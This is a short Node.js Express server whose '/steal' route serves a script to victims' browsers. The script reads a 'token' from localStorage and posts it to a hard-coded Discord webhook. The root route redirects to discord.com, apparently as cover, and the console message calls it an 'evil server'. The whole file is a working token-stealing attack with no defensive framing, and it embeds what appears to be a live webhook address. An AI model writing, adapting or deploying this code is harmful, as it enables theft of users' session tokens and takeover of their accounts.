const express = require('express');
const app = express();

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST');
    next();
});

app.get('/steal', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    res.send(`
        (function() {
            console.log('Script running');
            const token = localStorage.getItem('token');
            if (token) {
                console.log('Token found:', token);
                fetch('https://discord.com/api/webhooks/1369392037622845440/Tx6-5ztys2a-IczQ9tos8J-u6-aMuNczUS81xvv5ahKtHdPkO9fsN1PJ-PHEhFbWlYpV', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: \`Token: \${token}\` })
                }).catch(err => console.log('Fetch failed:', err));
            } else {
                console.log('No token in localStorage');
            }
        })();
    `);
});

app.get('/', (req, res) => {
    res.redirect('https://discord.com');
});

app.listen(3000, () => console.log('Evil server running...'));
